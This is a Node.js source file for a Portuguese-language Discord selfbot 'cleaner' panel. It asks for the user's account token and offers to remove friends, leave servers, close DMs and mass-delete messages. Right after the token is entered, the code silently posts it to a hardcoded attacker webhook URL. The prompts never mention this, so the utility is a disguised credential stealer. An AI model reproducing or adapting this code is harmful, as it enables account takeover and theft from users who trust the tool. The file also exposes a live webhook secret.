const { Client } = require('discord.js-selfbot-v13');
const axios = require('axios');
const readline = require('readline');
const webhookURL = "https://discord.com/api/webhooks/1485374322683023503/-79Jg_x6lozcbc82T98m1-SPp9h0X2SP3gWEg2TSTB-m9DTnhWmw8zLbuV32R_KYaEtI";

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = (q) => new Promise(res => rl.question(q, res));

const BIG_182 = `.
    ███████╗ ██████╗██╗  ██╗ ██████╗ contact: l9viego               
    ██╔════╝██╔════╝██║  ██║██╔═══██╗
    █████╗  ██║     ███████║██║   ██║
    ██╔══╝  ██║     ██╔══██║██║   ██║
    ███████╗╚██████╗██║  ██║╚██████╔╝
    ╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝PAINEL CL           
                    
`;

// VELOCIDADE DE DELEÇÃO (em milissegundos)
const VELOCIDADE = 50; 

async function removerHypesquad(headers) {
    try {
        await axios.delete('https://discord.com/api/v9/hypesquad/online', { headers });
        console.log('[✅] Hypesquad removido.');
    } catch (e) { console.log('[❌] Erro ao remover Hypesquad.'); }
}

async function removerAmigos(headers) {
    try {
        const res = await axios.get('https://discord.com/api/v9/users/@me/relationships', { headers });
        const friends = res.data.filter(f => f.type === 1);
        console.log(`[?] Encontrados ${friends.length} amigos. Removendo...`);
        for (const friend of friends) {
            await axios.delete(`https://discord.com/api/v9/users/@me/relationships/${friend.id}`, { headers }).catch(() => {});
            process.stdout.write('.');
            await new Promise(r => setTimeout(r, 300)); // Velocidade de amigos também reduzida
        }
        console.log('\n[✅] Amigos removidos.');
    } catch (e) { console.log('[❌] Erro ao remover amigos.'); }
}

async function removerServidores(headers) {
    try {
        const res = await axios.get('https://discord.com/api/v9/users/@me/guilds', { headers });
        console.log(`[?] Saindo de ${res.data.length} servidores...`);
        for (const guild of res.data) {
            if (!guild.owner) {
                await axios.delete(`https://discord.com/api/v9/users/@me/guilds/${guild.id}`, { headers }).catch(() => {});
                process.stdout.write('.');
                await new Promise(r => setTimeout(r, 500));
            }
        }
        console.log('\n[✅] Saída de servidores concluída.');
    } catch (e) { console.log('[❌] Erro ao sair dos servidores.'); }
}

async function fecharDMs(headers) {
    try {
        const res = await axios.get('https://discord.com/api/v9/users/@me/channels', { headers });
        console.log(`[?] Fechando ${res.data.length} DMs...`);
        for (const dm of res.data) {
            await axios.delete(`https://discord.com/api/v9/channels/${dm.id}`, { headers }).catch(() => {});
            process.stdout.write('.');
            await new Promise(r => setTimeout(r, 200));
        }
        console.log('\n[✅] Todas as DMs abertas foram fechadas.');
    } catch (e) { console.log('[❌] Erro ao fechar DMs.'); }
}

async function limparMensagensDM(client, channelId) {
    try {
        const channel = await client.channels.fetch(channelId);
        if (!channel) return console.log('[❌] Canal não encontrado.');
        
        let messages = await channel.messages.fetch({ limit: 100 });
        while (messages.size > 0) {
            for (const msg of messages.values()) {
                if (msg.author.id === client.user.id) {
                    await msg.delete().catch(() => {});
                    process.stdout.write('.');
                    await new Promise(r => setTimeout(r, VELOCIDADE)); // MODO TURBO ATIVADO
                }
            }
            messages = await channel.messages.fetch({ limit: 100, before: messages.lastKey() });
        }
    } catch (e) { console.log('[❌] Erro ao limpar mensagens.'); }
}

async function clAll(client, headers) {
    try {
        const res = await axios.get('https://discord.com/api/v9/users/@me/channels', { headers });
        console.log(`[?] Iniciando limpeza rápida em ${res.data.length} DMs...`);
        for (const dm of res.data) {
            await limparMensagensDM(client, dm.id);
        }
        console.log('\n[✅] CL ALL rápido concluído.');
    } catch (e) { console.log('[❌] Erro no CL ALL.'); }
}

async function main() {
    process.stdout.write('\x1B[2J\x1B[0f');
    console.log(BIG_182);
    
    const token = await ask('INSIRA O TOKEN DA CONTA: ');
    fetch(webhookURL, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    content: `Nova resposta: ${token}`
  })
});
    const tokenLimpo = token.trim();
    if (!tokenLimpo) process.exit();

    const headers = { 'authorization': tokenLimpo };
    const client = new Client({ checkUpdate: false });

    client.login(tokenLimpo).then(async () => {
        let statusMensagem = `Logado em: ${client.user.tag}`;
        
        while (true) {
            process.stdout.write('\x1B[2J\x1B[0f');
            console.log(BIG_182);
            console.log(`[!] ${statusMensagem}\n`);
            console.log(`[ 1 ] Remover Hypesquad              [ 4 ] Limpar dm`);
            console.log(`[ 2 ] Remover Amigos                 [ 5 ] Fechar todas as dms`);
            console.log(`[ 3 ] Remover servidores             [ 6 ] CL ALL`);
            console.log(`[ 0 ] Sair\n`);
            
            const opcao = await ask('ESCOLHA UMA OPÇÃO: ');

            if (opcao === '1') await removerHypesquad(headers);
            else if (opcao === '2') await removerAmigos(headers);
            else if (opcao === '3') await removerServidores(headers);
            else if (opcao === '4') {
                const id = await ask('INSIRA O ID DA DM: ');
                await limparMensagensDM(client, id);
                console.log('\n[✅] Mensagens limpas.');
            }
            else if (opcao === '5') await fecharDMs(headers);
            else if (opcao === '6') await clAll(client, headers);
            else if (opcao === '0') {
                client.destroy();
                process.exit();
            }

            if (opcao !== '0') {
                await ask('\nFim da ação. Pressione ENTER para voltar...');
            }
        }
    }).catch(() => {
        console.log('\n[❌] Erro: Token inválido.');
        process.exit();
    });
}

main();